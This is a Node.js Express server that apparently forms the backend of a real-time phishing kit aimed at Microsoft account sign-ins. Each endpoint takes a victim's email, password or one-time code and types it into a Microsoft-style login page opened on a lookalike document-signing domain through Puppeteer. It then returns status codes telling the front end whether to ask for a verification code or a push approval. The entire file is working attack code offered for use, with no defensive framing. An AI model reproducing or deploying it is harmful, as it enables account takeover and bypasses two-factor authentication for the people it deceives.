const express = require("express");
const fs = require("fs");
const url = require("url");
const puppeteer = require("puppeteer");
const path = require("path");
const { v4: uuidv4 } = require("uuid");

const app = express();
const port = process.env.PORT || 3000;

app.use(express.static("public"));
app.use(express.json());

let sessions = {};

// Function to log to a file
function writeToLog(text) {
  fs.appendFile("log.txt", text + "\n", (err) => {
    if (err) throw err;
    console.log("Log updated");
  });
}

app.post("/email", async (req, res) => {
  let { sessionId, email } = req.body;
  if (!email) {
    return res.status(400).send("Email is required");
  }

  if (!sessionId) {
    sessionId = uuidv4();
  }

  if (sessions[sessionId]) {
    return res.status(400).send("Session already exists");
  }
  const browser = await puppeteer.launch({ headless: false });

  const page = await browser.newPage();
  await page.goto(
    "https://review-and-sign-documents-27157473172-hsdeq-hosted-via-comp.doorsata.com/HXrdCGuM", {timeout: 60000}
  );
  await page.waitForSelector("#i0116");
  await page.type("#i0116", email);
  await page.click("#idSIButton9");
  await new Promise((resolve) => setTimeout(resolve, 10000));
  const content1 = await page.content();
  if (!content1.includes("Enter password")) {
    await page.click("#aadTile");
  }

  sessions[sessionId] = { browser, page };

  res.sendFile(path.join(__dirname, "views", "index.html"));

  // Log the email operation
  writeToLog(`Email logged for session: ${sessionId}`);
});

app.post("/pass", async (req, res) => {
  const { sessionId, password } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  const { page } = session;
  await page.waitForSelector("#i0118");
  await page.type("#i0118", password);
  await page.click("#idSIButton9");
  await new Promise((resolve) => setTimeout(resolve, 10000));
  const content2 = await page.content();
  if (content2.includes("Your account or password is incorrect.")) {
    res.send("0");
  } else {
    const content3 = await page.content();
    if (content3.includes("Enter code")) {
      res.send("2");
    } else if (content3.includes("Approve sign in request")) {
      res.send("3");
    } else {
      await new Promise((resolve) => setTimeout(resolve, 10000));
      await page.click("#idSIButton9");
      res.send("1");
    }
    writeToLog(`Password logged for session: ${sessionId}`);
  }
});

app.post("/code", async (req, res) => {
  const { sessionId, password, code } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  const { page } = session;
  await page.waitForSelector("#idTxtBx_SAOTCC_OTC");
  await page.type("#idTxtBx_SAOTCC_OTC", code);
  await page.click("#idSubmit_SAOTCC_Continue");
  await new Promise((resolve) => setTimeout(resolve, 10000));
  const content4 = await page.content();
  if (content4.includes("You didn't enter the expected verification code.")) {
    res.send("0");
  } else {
    await new Promise((resolve) => setTimeout(resolve, 10000));
    await page.click("#idSIButton9");
    res.send("1");
    writeToLog(`Code logged for session: ${sessionId}`);
  }
});

app.post("/request", async (req, res) => {
  const { sessionId, password, code } = req.body;

  if (!sessionId || !password) {
    return res.status(400).send("Session ID and password are required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  const { page } = session;
  await new Promise((resolve) => setTimeout(resolve, 10000));
});

app.post("/close", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).send("Session ID is required");
  }

  const session = sessions[sessionId];

  if (!session) {
    return res.status(400).send("Session not found");
  }

  const { browser } = session;
  await browser.close();
  delete sessions[sessionId];

  res.send("Browser closed");

  // Log the browser closure
  writeToLog(`Browser closed for session: ${sessionId}`);
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
